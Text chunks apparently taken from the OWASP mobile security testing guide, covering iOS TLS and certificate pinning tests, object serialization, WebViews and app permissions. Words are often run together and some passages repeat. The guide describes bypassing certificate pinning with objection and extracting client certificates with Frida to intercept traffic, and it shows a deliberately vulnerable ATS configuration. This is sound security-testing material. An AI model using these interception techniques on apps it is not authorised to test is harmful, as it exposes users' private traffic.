    "text": "nscurl can be used. A permutation of different settings will be executed and verified against the specified endpoint. If the default ATS secure connection test is passing, ATS can be used in its default secure configuration. If thereareanyfailsinthenscurloutput,pleasechangetheserversideconfigurationofTLStomaketheserversidemore secure,ratherthanweakeningtheconfigurationinATSontheclient. Seethearticle“IdentifyingtheSourceofBlocked Connections”intheAppleDeveloperDocumentationformoredetails. Refertosection“VerifyingtheTLSSettings”inchapterTestingNetworkCommunicationfordetails. Testing Custom Certificate Stores and Certificate Pinning Platform: ios MASVSV1: MSTG-NETWORK-4 MASVSV2: MASVS-NETWORK-2 Overview Static Analysis Verifythattheservercertificateispinned. Pinningcanbeimplementedonvariouslevelsintermsofthecertificatetree presentedbytheserver: 1. Includingserver’scertificateintheapplicationbundleandperformingverificationoneachconnection. Thisrequires anupdatemechanismswheneverthecertificateontheserverisupdated. 2. Limitingcertificateissuertoe.g.oneentityandbundlingtheintermediateCA’spublickeyintotheapplication. In thiswaywelimittheattacksurfaceandhaveavalidcertificate. 3. OwningandmanagingyourownPKI.TheapplicationwouldcontaintheintermediateCA’spublickey. Thisavoids updatingtheapplicationeverytimeyouchangethecertificateontheserver,duetoe.g.expiration. Notethatusing yourownCAwouldcausethecertificatetobeself-singed. ThelatestapproachrecommendedbyAppleistospecifyapinnedCApublickeyintheInfo.plistfileunderAppTransport SecuritySettings. YoucanfindanexampleintheirarticleIdentityPinning: Howtoconfigureservercertificatesforyour app. Another common approach is to use the connection:willSendRequestForAuthenticationChallenge: method of NSURLConnectionDelegatetocheckifthecertificateprovidedbytheserverisvalidandmatchesthecertificatestored intheapp. YoucanfindmoredetailsintheHTTPSServerTrustEvaluationtechnicalnote. Thefollowingthird-partylibrariesincludepinningfunctionality: • TrustKit: hereyoucanpinbysettingthepublickeyhashesinyourInfo.plistorprovidethehashesinadictionary. SeetheirREADMEformoredetails. • AlamoFire: hereyoucandefineaServerTrustPolicyperdomainforwhichyoucandefineaPinnedCertificat- esTrustEvaluator. Seeitsdocumentationformoredetails. • AFNetworking: hereyoucansetanAFSecurityPolicytoconfigureyourpinning. Dynamic Analysis Server certificate pinning FollowtheinstructionsfromtheDynamicAnalysissectionof“TestingEndpointIdentityVerification. Ifdoingsodoesn’t leadtotrafficbeingproxied,itmaymeanthatcertificatepinningisactuallyimplementedandallsecuritymeasuresare inplace. Doesthesamehappenforalldomains? 431\\nAs a quick smoke test, you can try to bypass certificate pinning using objection as described in “Bypassing Certificate Pinning”. PinningrelatedAPIsbeinghookedbyobjectionshouldappearinobjection’soutput. However,keepinmindthat: • theAPIsmightnotbecomplete. • ifnothingishooked,thatdoesn’tnecessarilymeanthattheappdoesn’timplementpinning. Inbothcases,theapporsomeofitscomponentsmightimplementcustompinninginawaythatissupportedbyobjection. Pleasecheckthestaticanalysissectionforspecificpinningindicatorsandmorein-depthtesting. Client certificate validation Someapplications usemTLS (mutual TLS),meaning that theapplication verifiesthe server’s certificateand the server verifies the client’s certificate. You can notice this if there is an error in Burp Alerts tab indicating that client failed to negotiateconnection. Thereareacoupleofthingsworthnoting: 1. Theclientcertificatecontainsaprivatekeythatwillbeusedforthekeyexchange. 2. Usuallythecertificatewouldalsoneedapasswordtouse(decrypt)it. 3. Thecertificatecanbestoredinthebinaryitself,datadirectoryorintheKeychain. The most common and improper way of using mTLS is to store the client certificate within the application bundle and hardcodethepassword. Thisobviouslydoesnotbringmuchsecurity,becauseallclientswillsharethesamecertificate. Second way of storing the certificate (and possibly password) is to use the Keychain. Upon first login, the application shoulddownloadthepersonalcertificateandstoreitsecurelyintheKeychain. Sometimesapplicationshaveonecertificatethatishardcodedanduseitforthefirstloginandthenthepersonalcertificate isdownloaded. Inthiscase,checkifit’spossibletostillusethe‘generic’certificatetoconnecttotheserver. Onceyouhaveextractedthecertificatefromtheapplication(e.g.usingFrida),additasclientcertificateinBurp,andyou willbeabletointerceptthetraffic. Testing Endpoint Identity Verification Platform: ios MASVSV1: MSTG-NETWORK-3 MASVSV2: MASVS-NETWORK-1 432\\nOverview Static Analysis UsingTLStotransportsensitiveinformationoverthenetworkisessentialforsecurity. However,encryptingcommunication betweenamobileapplicationanditsbackendAPIisnottrivial. Developersoftendecideonsimplerbutlesssecuresolutions (e.g.,thosethatacceptanycertificate)tofacilitatethedevelopmentprocess,andsometimestheseweaksolutionsmake itintotheproductionversion,potentiallyexposinguserstoman-in-the-middleattacks. Thesearesomeoftheissuesshouldbeaddressed: • CheckiftheapplinksagainstanSDKolderthaniOS9.0. InthatcaseATSisdisablednomatterwhichversionof theOStheapprunson. • Verifythatacertificatecomesfromatrustedsource,i.e.atrustedCA(CertificateAuthority). • Determinewhethertheendpointserverpresentstherightcertificate. Makesurethatthehostnameandthecertificateitselfareverifiedcorrectly. Examplesandcommonpitfallsareavailable intheofficialAppledocumentation. Wehighlyrecommendsupportingstaticanalysiswiththedynamicanalysis. Ifyoudon’thavethesourcecodeortheapp isdifficulttoreverseengineer,havingasoliddynamicanalysisstrategycandefinitelyhelp. Inthatcaseyouwon’tknowif theappusesloworhigh-levelAPIsbutyoucanstilltestfordifferenttrustevaluationscenarios(e.g.“doestheappaccept aself-signedcertificate?”). Dynamic Analysis OurtestapproachistograduallyrelaxsecurityoftheSSLhandshakenegotiationandcheckwhichsecuritymechanisms areenabled. 1. HavingBurpsetupasaproxy,makesurethatthereisnocertificateaddedtothetruststore(Settings->General ->Profiles)andthattoolslikeSSLKillSwitcharedeactivated. Launchyourapplicationandcheckifyoucansee thetrafficinBurp. Anyfailureswillbereportedunder‘Alerts’tab. Ifyoucanseethetraffic,itmeansthatthereis nocertificatevalidationperformedatall. Ifhowever,youcan’tseeanytrafficandyouhaveaninformationabout SSLhandshakefailure,followthenextpoint. 2. Now,installtheBurpcertificate,asexplainedinBurp’suserdocumentation. Ifthehandshakeissuccessfulandyou canseethetrafficinBurp,itmeansthatthecertificateisvalidatedagainstthedevice’struststore,butnopinning isperformed. If executing the instructions from the previous step doesn’t lead to traffic being proxied, it may mean that certificate pinningisactuallyimplementedandallsecuritymeasuresareinplace. However,youstillneedtobypassthepinningin ordertotesttheapplication. Pleaserefertothesection“BypassingCertificatePinning”formoreinformationonthis. Testing Data Encryption on the Network Platform: ios MASVSV1: MSTG-NETWORK-1 MASVSV2: MASVS-NETWORK-1 Overview Allthepresentedcasesmustbecarefullyanalyzedasawhole. Forexample, eveniftheappdoesnotpermitcleartext trafficinitsInfo.plist,itmightactuallystillbesendingHTTPtraffic. Thatcouldbethecaseifit’susingalow-levelAPI(for whichATSisignored)orabadlyconfiguredcross-platformframework. IMPORTANT:Youshouldapplytheseteststotheappmaincodebutalsotoanyappextensions,frameworksorWatch appsembeddedwithintheappaswell. 433\\nFormoreinformationrefertothearticle“PreventingInsecureNetworkConnections”and“Fine-tuneyourAppTransport Securitysettings”intheAppleDeveloperDocumentation. Static Analysis Testing Network Requests over Secure Protocols First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make surethatsensitiveinformationissentoversecurechannelsbyusingURLSession(whichusesthestandardURLLoading SystemfromiOS)orNetwork(forsocket-levelcommunicationusingTLSandaccesstoTCPandUDP). Check for Low-Level Networking API Usage IdentifythenetworkAPIsusedbytheappandseeifitusesanylow-levelnetworkingAPIs. Apple Recommendation: Prefer High-Level Frameworks in Your App: “ATSdoesn’tapplytocallsyourapp makes to lower-level networking interfaces like the Network framework or CFNetwork. In these cases, you take responsibility for ensuring the security of the connection. You can construct a secure connection this way, but mistakes are both easy to make and costly. It’s typically safest to rely on the URL Loading System instead” (see source). Iftheappusesanylow-levelAPIssuchasNetworkorCFNetwork,youshouldcarefullyinvestigateiftheyarebeingused securely. Forappsusingcross-platformframeworks(e.g.Flutter,Xamarin,...)andthirdpartyframeworks(e.g.Alamofire) youshouldanalyzeifthey’rebeingconfiguredandusedsecurelyaccordingtotheirbestpractices. Makesurethattheapp: • verifiesthechallengetypeandthehostnameandcredentialswhenperformingservertrustevaluation. • doesn’tignoreTLSerrors. • doesn’tuseanyinsecureTLSconfigurations(see“TestingtheTLSSettings”) Thesechecksareorientative,wecannotnamespecificAPIssinceeveryappmightuseadifferentframework. Pleaseuse thisinformationasareferencewheninspectingthecode. Testing for Cleartext Traffic EnsurethattheappisnotallowingcleartextHTTPtraffic. SinceiOS9.0cleartextHTTPtrafficisblockedbydefault(due toAppTransportSecurity(ATS))buttherearemultiplewaysinwhichanapplicationcanstillsendit: • Configuring ATS to enable cleartext traffic by setting the NSAllowsArbitraryLoads attribute to true (or YES) on NSAppTransportSecurityintheapp’sInfo.plist. • RetrievetheInfo.plist • CheckthatNSAllowsArbitraryLoadsisnotsettotruegloballyofforanydomain. • If the application opens third party web sites in WebViews, then from iOS 10 onwards NSAllowsArbitraryLoad- sInWebContentcanbeusedtodisableATSrestrictionsforthecontentloadedinwebviews. Apple",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 146
    }
  },
  {
    "text": "Pleaseuse thisinformationasareferencewheninspectingthecode. Testing for Cleartext Traffic EnsurethattheappisnotallowingcleartextHTTPtraffic. SinceiOS9.0cleartextHTTPtrafficisblockedbydefault(due toAppTransportSecurity(ATS))buttherearemultiplewaysinwhichanapplicationcanstillsendit: • Configuring ATS to enable cleartext traffic by setting the NSAllowsArbitraryLoads attribute to true (or YES) on NSAppTransportSecurityintheapp’sInfo.plist. • RetrievetheInfo.plist • CheckthatNSAllowsArbitraryLoadsisnotsettotruegloballyofforanydomain. • If the application opens third party web sites in WebViews, then from iOS 10 onwards NSAllowsArbitraryLoad- sInWebContentcanbeusedtodisableATSrestrictionsforthecontentloadedinwebviews. Apple warns: Disabling ATS means that unsecured HTTP connections are allowed. HTTPS connections are also allowed,andarestillsubjecttodefaultservertrustevaluation. However,extendedsecuritychecks—likerequiring aminimumTransportLayerSecurity(TLS)protocolversion—aredisabled. WithoutATS,you’realsofreetoloosen thedefaultservertrustrequirements,asdescribedin“PerformingManualServerTrustAuthentication”. ThefollowingsnippetshowsavulnerableexampleofanappdisablingATSrestrictionsglobally. <key>NSAppTransportSecurity</key> <dict> <key>NSAllowsArbitraryLoads</key> <true/> </dict> 434\\nATS should be examined taking the application’s context into consideration. The application may have to define ATS exceptionstofulfillitsintendedpurpose. Forexample,theFirefoxiOSapplicationhasATSdisabledglobally. Thisexception isacceptablebecauseotherwisetheapplicationwouldnotbeabletoconnecttoanyHTTPwebsitethatdoesnothaveall theATSrequirements. Insomecases,appsmightdisableATSgloballybutenableitforcertaindomainstoe.g.securely loadmetadataorstillallowsecurelogin. ATSshouldincludeajustificationstringforthis(e.g.“Theappmustconnecttoaservermanagedbyanotherentitythat doesn’tsupportsecureconnections.”). Dynamic Analysis Intercept the tested app’s incoming and outgoing network traffic and make sure that this traffic is encrypted. You can interceptnetworktrafficinanyofthefollowingways: • CaptureallHTTP(S)andWebsockettrafficwithaninterceptionproxylikeOWASPZAPorBurpSuiteandmakesure allrequestsaremadeviaHTTPSinsteadofHTTP. • InterceptionproxieslikeBurpandOWASPZAPwillshowHTTP(S)trafficonly. Youcan,however,useaBurpplugin suchasBurp-non-HTTP-Extensionorthetoolmitm-relaytodecodeandvisualizecommunicationviaXMPPandother protocols. SomeapplicationsmaynotworkwithproxieslikeBurpandOWASPZAPbecauseofCertificatePinning. Insucha scenario,pleasecheck“TestingCustomCertificateStoresandCertificatePinning”. Formoredetailsreferto: • “InterceptingTrafficontheNetworkLayer”fromchapter“TestingNetworkCommunication” • “SettingupaNetworkTestingEnvironment”fromchapteriOSBasicSecurityTesting 435\\niOS Platform APIs Overview Enforced Updating Enforcedupdatingcanbehelpfulwhenitcomestopublickeypinning(seetheTestingNetworkcommunicationformore details) when a pin has to be refreshed due to a certificate/public key rotation. Additionally, vulnerabilities are easily patchedbymeansofforcedupdates. ThechallengewithiOShowever,isthatAppledoesnotprovideanyAPIsyettoautomatethisprocess,instead,developers will have to create their own mechanism, such as described at various blogs which boil down to looking up properties of the app using http://itunes.apple.com/lookup\\?id\\<BundleId> or third party libraries, such as Siren and react- native-appstore-version-checker. Most of these implementations will require a certain given version offered by an API or just “latest in the appstore”, which means users can be frustrated with having to update the app, even though no business/securityneedforanupdateistrulythere. Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle managementiskeyhere. Similarly,whenauserisnotforcedtoupdate,donotforgettotestolderversionsofyourapp againstyourAPIand/oruseproperAPIversioning. Object Persistence ThereareseveralwaystopersistanobjectoniOS: Object Encoding iOScomeswithtwoprotocolsforobjectencodinganddecodingforObjective-CorNSObjects: NSCodingandNSSecure- Coding. When a class conforms to either of the protocols, the data is serialized to NSData: a wrapper for byte buffers. NotethatDatainSwiftisthesameasNSDataoritsmutablecounterpart: NSMutableData. TheNSCodingprotocoldeclares the two methods that must be implemented in order to encode/decode its instance-variables. A class using NSCoding needstoimplementNSObjectorbeannotatedasan@objcclass. TheNSCodingprotocolrequirestoimplementencode andinitasshownbelow. class CustomPoint:NSObject,NSCoding { //requiredbyNSCoding: func encode(with aCoder:NSCoder){ aCoder.encode(x,forKey:\"x\") aCoder.encode(name,forKey:\"name\") } varx:Double =0.0 varname:String =\"\" init(x:Double,name:String){ self.x=x self.name =name } //requiredbyNSCoding:initializemembersusingadecoder. required convenience init?(coderaDecoder:NSCoder){ guard letname =aDecoder.decodeObject(forKey:\"name\")as?String else {return nil} self.init(x:aDecoder.decodeDouble(forKey:\"x\"), name:name) } //getters/setters/etc. } TheissuewithNSCodingisthattheobjectisoftenalreadyconstructedandinsertedbeforeyoucanevaluatetheclass- type. Thisallowsanattackertoeasilyinjectallsortsofdata. Therefore,theNSSecureCodingprotocolhasbeenintroduced. WhenconformingtoNSSecureCodingyouneedtoinclude: 436\\nstatic varsupportsSecureCoding:Bool { return true } wheninit(coder:) ispartoftheclass. Next,whendecodingtheobject,acheckshouldbemade,e.g.: letobj=decoder.decodeObject(of:MyClass.self,forKey:\"myKey\") The conformance to NSSecureCoding ensures that objects being instantiated are indeed the ones that were expected. However,therearenoadditionalintegritychecksdoneoverthedataandthedataisnotencrypted. Therefore,anysecret dataneedsadditionalencryptionanddataofwhichtheintegritymustbeprotected,shouldgetanadditionalHMAC. Note,whenNSData(Objective-C)orthekeywordlet(Swift)isused: thenthedataisimmutableinmemoryandcannot beeasilyremoved. Object Archiving with NSKeyedArchiver NSKeyedArchiverisaconcretesubclassofNSCoderandprovidesawaytoencodeobjectsandstoretheminafile. The NSKeyedUnarchiverdecodesthedataandrecreatestheoriginaldata. Let’staketheexampleoftheNSCodingsection andnowarchiveandunarchivethem: //archiving: NSKeyedArchiver.archiveRootObject(customPoint,toFile:\"/path/to/archive\") //unarchiving: guard letcustomPoint =NSKeyedUnarchiver.unarchiveObjectWithFile(\"/path/to/archive\")as? CustomPoint else {return nil} Whendecodingakeyedarchive,becausevaluesarerequestedbyname,valuescanbedecodedoutofsequenceornotat all. Keyedarchives,therefore,providebettersupportforforwardandbackwardcompatibility. Thismeansthatanarchive ondiskcouldactuallycontainadditionaldatawhichisnotdetectedbytheprogram,unlessthekeyforthatgivendatais providedatalaterstage. Note that additional protection needs to be in place to secure the file in case of confidential data, as the data is not encryptedwithinthefile. Seethechapter“DataStorageoniOS”formoredetails. Codable WithSwift 4, the Codable type alias arrived: it is a combination of theDecodable and Encodable protocols. A String, Int,Double,Date,DataandURLareCodablebynature: meaningtheycaneasilybeencodedanddecodedwithoutany additionalwork. Let’stakethefollowingexample: struct CustomPointStruct:Codable { varx:Double varname:String } By adding Codable to the inheritance list for the CustomPointStruct in the example, the methods init(from:) and encode(to:) areautomaticallysupported. ForemoredetailsabouttheworkingsofCodablechecktheAppleDeveloper",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 147
    }
  },
  {
    "text": "Seethechapter“DataStorageoniOS”formoredetails. Codable WithSwift 4, the Codable type alias arrived: it is a combination of theDecodable and Encodable protocols. A String, Int,Double,Date,DataandURLareCodablebynature: meaningtheycaneasilybeencodedanddecodedwithoutany additionalwork. Let’stakethefollowingexample: struct CustomPointStruct:Codable { varx:Double varname:String } By adding Codable to the inheritance list for the CustomPointStruct in the example, the methods init(from:) and encode(to:) areautomaticallysupported. ForemoredetailsabouttheworkingsofCodablechecktheAppleDeveloper Documentation. The Codables can easily be encoded / decoded into various representations: NSData using NSCod- ing/NSSecureCoding,JSON,PropertyLists,XML,etc. Seethesubsectionsbelowformoredetails. JSON and Codable TherearevariouswaystoencodeanddecodeJSONwithiniOSbyusingdifferent3rdpartylibraries: • Mantle • JSONModellibrary • SwiftyJSONlibrary • ObjectMapperlibrary 437\\n• JSONKit • JSONModel • YYModel • SBJson5 • Unbox • Gloss • Mapper • JASON • Arrow ThelibrariesdifferintheirsupportforcertainversionsofSwiftandObjective-C,whethertheyreturn(im)mutableresults, speed,memoryconsumptionandactuallibrarysize. Again,noteincaseofimmutability: confidentialinformationcannot beremovedfrommemoryeasily. Next, Apple provides support for JSON encoding/decoding directly by combining Codable together with a JSONEncoder andaJSONDecoder: struct CustomPointStruct:Codable { varpoint:Double varname:String } letencoder =JSONEncoder() encoder.outputFormatting =.prettyPrinted lettest =CustomPointStruct(point:10,name:\"test\") letdata =tryencoder.encode(test) letstringData =String(data:data,encoding:.utf8) //stringData=Optional({ //\"point\":10, //\"name\":\"test\" //}) JSON itself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that containssecretshasbeenappropriatelyprotected(e.g.,encrypted/HMACed). Seethechapter“DataStorageoniOS”for moredetails. Property Lists and Codable Youcanpersistobjectstopropertylists(alsocalledplistsinprevioussections). Youcanfindtwoexamplesbelowofhow touseit: //archiving: letdata =NSKeyedArchiver.archivedDataWithRootObject(customPoint) NSUserDefaults.standardUserDefaults().setObject(data,forKey:\"customPoint\") //unarchiving: ifletdata =NSUserDefaults.standardUserDefaults().objectForKey(\"customPoint\")as?NSData { letcustomPoint =NSKeyedUnarchiver.unarchiveObjectWithData(data) } In this first example, the NSUserDefaults are used, which is the primary property list. We can do the same with the Codableversion: struct CustomPointStruct:Codable { varpoint:Double varname:String } varpoints:[CustomPointStruct]=[ CustomPointStruct(point:1,name:\"test\"), CustomPointStruct(point:2,name:\"test\"), CustomPointStruct(point:3,name:\"test\"), ] UserDefaults.standard.set(try?PropertyListEncoder().encode(points),forKey:\"points\") ifletdata =UserDefaults.standard.value(forKey:\"points\")as?Data { letpoints2 =try?PropertyListDecoder().decode([CustomPointStruct].self,from:data) } 438\\nNotethatplistfilesarenotmeanttostoresecretinformation. Theyaredesignedtoholduserpreferencesforan app. XML TherearemultiplewaystodoXMLencoding. SimilartoJSONparsing,therearevariousthirdpartylibraries,suchas: • Fuzi • Ono • AEXML • RaptureXML • SwiftyXMLParser • SWXMLHash They vary in terms of speed, memory usage, object persistence and more important: differ in how they handle XML external entities. See XXE in the Apple iOS Office viewer as an example. Therefore, it is key to disable external entity parsingifpossible. SeetheOWASPXXEpreventioncheatsheetformoredetails. Nexttothelibraries,youcanmakeuse ofApple’sXMLParserclass When not using third party libraries, but Apple’s XMLParser, be sure to let shouldResolveExternalEntities return false. Object-Relational Mapping (CoreData and Realm) TherearevariousORM-likesolutionsforiOS.ThefirstoneisRealm,whichcomeswithitsownstorageengine. Realmhas settingstoencryptthedataasexplainedinRealm’sdocumentation. Thisallowsforhandlingsecuredata. Notethatthe encryptionisturnedoffbydefault. AppleitselfsuppliesCoreData,whichiswellexplainedintheAppleDeveloperDocumentation. Itsupportsvariousstorage backendsasdescribedinApple’sPersistentStoreTypesandBehaviorsdocumentation. Theissuewiththestorageback- endsrecommendedbyApple, isthatnoneofthetypeofdatastoresisencrypted, norcheckedforintegrity. Therefore, additional actions are necessary in case of confidential data. An alternative can be found in project iMas, which does supplyoutoftheboxencryption. Protocol Buffers ProtocolBuffersbyGoogle,areaplatform-andlanguage-neutralmechanismforserializingstructureddatabymeansof theBinaryDataFormat. TheyareavailableforiOSbymeansoftheProtobuflibrary. Therehavebeenafewvulnerabil- itieswithProtocolBuffers, suchasCVE-2015-5237. NotethatProtocol Buffers do not provide any protection for confidentialityasnobuilt-inencryptionisavailable. WebViews WebViews are in-app browser components for displaying interactive web content. They can be used to embed web content directly into an app’s user interface. iOS WebViews support JavaScript execution by default, so script injection andCross-SiteScriptingattackscanaffectthem. Types of WebViews TherearemultiplewaystoincludeaWebViewinaniOSapplication: • UIWebView • WKWebView • SFSafariViewController UIWebView UIWebViewisdeprecatedstartingoniOS12andshouldnotbeused. MakesurethateitherWKWebVieworSFSafariView- Controllerareusedtoembedwebcontent. Inadditiontothat, JavaScriptcannotbedisabledforUIWebViewwhichis anotherreasontorefrainfromusingit. 439\\nWKWebView WKWebViewwasintroducedwithiOS8andistheappropriatechoiceforextendingappfunctionality,controllingdisplayed content(i.e.,preventtheuserfromnavigatingtoarbitraryURLs)andcustomizing. WKWebViewcomeswithseveralsecurityadvantagesoverUIWebView: • JavaScriptisenabledbydefaultbutthankstothejavaScriptEnabledpropertyofWKWebView,itcanbecompletely disabled,preventingallscriptinjectionflaws. • The JavaScriptCanOpenWindowsAutomatically can be used to prevent JavaScript from opening new windows, suchaspop-ups. • ThehasOnlySecureContentpropertycanbeusedtoverifyresourcesloadedbytheWebViewareretrievedthrough encryptedconnections. • WKWebViewimplementsout-of-processrendering,somemorycorruptionbugswon’taffectthemainappprocess. A JavaScript Bridge can be enabled when using WKWebView and UIWebView. See Section “Native Functionality Exposed ThroughWebViews”belowformoreinformation. SFSafariViewController SFSafariViewControllerisavailablestartingoniOS9andshouldbeusedtoprovideageneralizedwebviewingexperi- ence. TheseWebViewscanbeeasilyspottedastheyhaveacharacteristiclayoutwhichincludesthefollowingelements: • Aread-onlyaddressfieldwithasecurityindicator. • AnAction(“Share”)button. • ADonebutton,backandforwardnavigationbuttons,anda“Safari”buttontoopenthepagedirectlyinSafari. 440\\nThereareacoupleofthingstoconsider: • JavaScriptcannotbedisabledinSFSafariViewControllerandthisisoneofthereasonswhytheusageofWKWeb- Viewisrecommendedwhenthegoalisextendingtheapp’suserinterface. • SFSafariViewControlleralsosharescookiesandotherwebsitedatawithSafari. • Theuser’sactivityandinteractionwithaSFSafariViewControllerarenotvisibletotheapp,whichcannotaccess AutoFilldata,browsinghistory,orwebsitedata. • AccordingtotheAppStoreReviewGuidelines,SFSafariViewControllersmaynotbehiddenorobscuredbyother viewsorlayers. Thisshouldbesufficientforanappanalysisandtherefore,SFSafariViewControllersareoutofscopefortheStaticand DynamicAnalysissections. Safari Web Inspector EnablingSafariwebinspectiononiOSallowsyoutoinspectthecontentsofaWebViewremotelyfromamacOSdevice. Bydefault,youcanviewthecontentsofanypageloadedintotheSafariappbecausetheSafariapphastheget-task- 441\\nallowedentitlement. ApplicationsinstalledfromtheAppstorewillhowevernothavethisentitlement,andsocannotbe attachedto. Onjailbrokendevices,thisentitlementcanbeaddedtoanyapplicationbyinstallingtheInspectorplustweak fromtheBigBossrepo. EnablingtheSafariWebInspectorisespeciallyinterestinginapplicationsthatexposenativeAPIsusingaJavaScriptbridge, forexampleinhybridapplications. Toactivatethewebinspectionyouhavetofollowthesesteps: 1. OntheiOSdeviceopentheSettingsapp: GotoSafari->AdvancedandtoggleonWebInspector. 2. OnthemacOSdevice,openSafari: inthemenubar,gotoSafari->Preferences->AdvancedandenableShow Developmenuinmenubar. 3. Connect your iOS",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 148
    }
  },
  {
    "text": "Exposed ThroughWebViews”belowformoreinformation. SFSafariViewController SFSafariViewControllerisavailablestartingoniOS9andshouldbeusedtoprovideageneralizedwebviewingexperi- ence. TheseWebViewscanbeeasilyspottedastheyhaveacharacteristiclayoutwhichincludesthefollowingelements: • Aread-onlyaddressfieldwithasecurityindicator. • AnAction(“Share”)button. • ADonebutton,backandforwardnavigationbuttons,anda“Safari”buttontoopenthepagedirectlyinSafari. 440\\nThereareacoupleofthingstoconsider: • JavaScriptcannotbedisabledinSFSafariViewControllerandthisisoneofthereasonswhytheusageofWKWeb- Viewisrecommendedwhenthegoalisextendingtheapp’suserinterface. • SFSafariViewControlleralsosharescookiesandotherwebsitedatawithSafari. • Theuser’sactivityandinteractionwithaSFSafariViewControllerarenotvisibletotheapp,whichcannotaccess AutoFilldata,browsinghistory,orwebsitedata. • AccordingtotheAppStoreReviewGuidelines,SFSafariViewControllersmaynotbehiddenorobscuredbyother viewsorlayers. Thisshouldbesufficientforanappanalysisandtherefore,SFSafariViewControllersareoutofscopefortheStaticand DynamicAnalysissections. Safari Web Inspector EnablingSafariwebinspectiononiOSallowsyoutoinspectthecontentsofaWebViewremotelyfromamacOSdevice. Bydefault,youcanviewthecontentsofanypageloadedintotheSafariappbecausetheSafariapphastheget-task- 441\\nallowedentitlement. ApplicationsinstalledfromtheAppstorewillhowevernothavethisentitlement,andsocannotbe attachedto. Onjailbrokendevices,thisentitlementcanbeaddedtoanyapplicationbyinstallingtheInspectorplustweak fromtheBigBossrepo. EnablingtheSafariWebInspectorisespeciallyinterestinginapplicationsthatexposenativeAPIsusingaJavaScriptbridge, forexampleinhybridapplications. Toactivatethewebinspectionyouhavetofollowthesesteps: 1. OntheiOSdeviceopentheSettingsapp: GotoSafari->AdvancedandtoggleonWebInspector. 2. OnthemacOSdevice,openSafari: inthemenubar,gotoSafari->Preferences->AdvancedandenableShow Developmenuinmenubar. 3. Connect your iOS device to the macOS device and unlock it: the iOS device name should appear in theDevelop menu. 4. (If not yet trusted) On macOS’s Safari, go to the Develop menu, click on the iOS device name, then on “Use for Development”andenabletrust. ToopenthewebinspectoranddebugaWebView: 1. IniOS,opentheappandnavigatetothescreenthatshouldcontainaWebView. 2. InmacOSSafari, gotoDeveloper -> ‘iOS Device Name’andyoushouldseethenameoftheWebViewbased context. ClickonittoopentheWebInspector. Nowyou’reabletodebugtheWebViewasyouwouldwitharegularwebpageonyourdesktopbrowser. Native Functionality Exposed Through WebViews IniOS7,AppleintroducedAPIsthatallowcommunicationbetweentheJavaScriptruntimeintheWebViewandthenative SwiftorObjective-Cobjects. IftheseAPIsareusedcarelessly,importantfunctionalitymightbeexposedtoattackerswho managetoinjectmaliciousscriptsintotheWebView(e.g.,throughasuccessfulCross-SiteScriptingattack). BothUIWebViewandWKWebViewprovideameansofcommunicationbetweentheWebViewandthenativeapp. Anyimpor- tantdataornativefunctionalityexposedtotheWebViewJavaScriptenginewouldalsobeaccessibletorogueJavaScript runningintheWebView. UIWebView: TherearetwofundamentalwaysofhownativecodeandJavaScriptcancommunicate: • JSContext: WhenanObjective-CorSwiftblockisassignedtoanidentifierinaJSContext,JavaScriptCoreautomat- icallywrapstheblockinaJavaScriptfunction. • JSExport protocol: Properties, instance methods and class methods declared in a JSExport-inherited protocol aremappedtoJavaScriptobjectsthatareavailabletoallJavaScriptcode. Modificationsofobjectsthatareinthe JavaScriptenvironmentarereflectedinthenativeenvironment. NotethatonlyclassmembersdefinedintheJSExportprotocolaremadeaccessibletoJavaScriptcode. WKWebView: JavaScript code in a WKWebView can still send messages back to the native app but in contrast to UIWebView, it is not possibletodirectlyreferencetheJSContextofaWKWebView. Instead,communicationisimplementedusingamessaging systemandusingthepostMessagefunction,whichautomaticallyserializesJavaScriptobjectsintonativeObjective-Cor Swiftobjects. Messagehandlersareconfiguredusingthemethodadd(_ scriptMessageHandler:name:). App Permissions IncontrasttoAndroid,whereeachapprunsonitsownuserID,iOSmakesallthird-partyappsrununderthenon-privileged mobile user. Each app has a unique home directory and is sandboxed, so that they cannot access protected system resourcesorfilesstoredbythesystemorbyotherapps. Theserestrictionsareimplementedviasandboxpolicies(aka. profiles),whichareenforcedbytheTrustedBSD(MAC)MandatoryAccessControlFrameworkviaakernelextension. iOS applies a generic sandbox profile to all third-party apps called container. Access to protected resources or data (some alsoknownasappcapabilities)ispossible,butit’sstrictlycontrolledviaspecialpermissionsknownasentitlements. 442\\nSomepermissionscanbeconfiguredbytheapp’sdevelopers(e.g.DataProtectionorKeychainSharing)andwilldirectly takeeffectaftertheinstallation. However,forothers,theuserwillbeexplicitlyaskedthefirsttimetheappattemptsto accessaprotectedresource,forexample: • Bluetoothperipherals • Calendardata • Camera • Contacts • Healthsharing • Healthupdating • HomeKit • Location • Microphone • Motion • Musicandthemedialibrary • Photos • Reminders • Siri • Speechrecognition • theTVprovider EventhoughAppleurgestoprotecttheprivacyoftheuserandtobeveryclearonhowtoaskpermissions,itcanstillbe thecasethatanapprequeststoomanyofthemfornon-obviousreasons. VerifyingtheuseofsomepermissionssuchasCamera,Photos,CalendarData,Motion,ContactsorSpeechRecognition should be pretty straightforward as it should be obvious if the app requires them to fulfill its tasks. Let’s consider the following examples regarding the Photos permission, which, if granted, gives the app access to all user photos in the “CameraRoll”(theiOSdefaultsystem-widelocationforstoringphotos): • ThetypicalQRCodescanningappobviouslyrequiresthecameratofunctionbutmightberequestingthephotos permission as well. If storage is explicitly required, and depending on the sensitivity of the pictures being taken, theseappsmightbetteropttousetheappsandboxstoragetoavoidotherapps(havingthephotospermission)to accessthem. Seethechapter“DataStorageoniOS”formoreinformationregardingstorageofsensitivedata. • Some apps require photo uploads (e.g. for profile pictures). Recent versions of iOS introduce new APIs such as UIImagePickerController (iOS 11+) and its modern replacement PHPickerViewController (iOS 14+). These APIs run on a separate process from your app and by using them, the app gets read-only access exclusively to theimagesselectedbytheuserinsteadoftothewhole“CameraRoll”. Thisisconsideredabestpracticetoavoid requestingunnecessarypermissions. VerifyingotherpermissionslikeBluetoothorLocationrequireadeepersourcecodeinspection. Theymayberequiredfor theapptoproperlyfunctionbutthedatabeinghandledbythosetasksmightnotbeproperlyprotected. Whencollectingorsimplyhandling(e.g.caching)sensitivedata,anappshouldprovidepropermechanismstogivethe 